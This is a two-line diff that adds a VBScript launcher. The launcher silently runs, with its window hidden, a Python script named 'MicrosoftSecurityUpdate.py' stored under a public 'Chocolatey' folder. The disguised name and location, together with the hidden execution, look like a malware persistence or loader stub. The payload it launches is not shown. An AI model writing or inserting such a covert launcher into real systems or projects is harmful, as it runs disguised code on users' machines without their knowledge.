@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+intReturn = objShell.Run("python.exe C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py", 0)
